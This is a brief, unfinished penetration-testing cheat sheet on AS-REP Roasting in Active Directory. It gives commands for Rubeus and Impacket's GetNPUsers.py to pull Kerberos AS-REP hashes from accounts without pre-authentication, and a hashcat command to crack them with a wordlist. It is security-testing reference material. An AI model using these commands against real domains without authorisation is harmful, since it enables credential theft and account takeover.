# AS-REP Roasting

#### STILL EDITING

#### AS-REP Roasting

> **AS-REP Roasting** dumps the `krbasrep5` hashes of user accounts that have Kerberos pre-authentication disabled.

* **Rubeus** (local => automatically find as-rep roastable users):

```powershell
.\Rubeus.exe asreproast
```

* **Impacket** (remote => requires to enumerate as-rep roastable users with `BloodHound` for instance):

```bash
GetNPUsers.py <Domain>/[username] -dc-ip <IP> -request  [-no-pass -usersfile users.txt]
```

* Cracking Kerberos 5 AS-REP etype 23 _(sometimes need to add `$23` after `$krb5asrep`)_:

```bash
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
